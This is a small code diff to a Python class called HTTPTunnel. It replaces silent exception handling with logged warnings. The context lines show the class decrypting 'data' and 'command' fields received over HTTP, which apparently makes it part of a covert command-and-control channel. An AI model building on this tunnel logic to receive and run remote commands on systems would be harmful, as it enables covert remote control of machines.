@@ -480,8 +480,8 @@ class HTTPTunnel:
                     if "data" in resp_data:
                         decrypted = self._encrypt(self._decode(resp_data["data"]))
                         return decrypted.decode()
-                except Exception:
-                    pass
+                except Exception as exc:
+                    logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)
 
                 return response.text[:1000]
 
@@ -517,8 +517,8 @@ class HTTPTunnel:
                     if "command" in data:
                         decrypted = self._encrypt(self._decode(data["command"]))
                         return decrypted.decode()
-                except Exception:
-                    pass
+                except Exception as exc:
+                    logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)
 
             return None
 
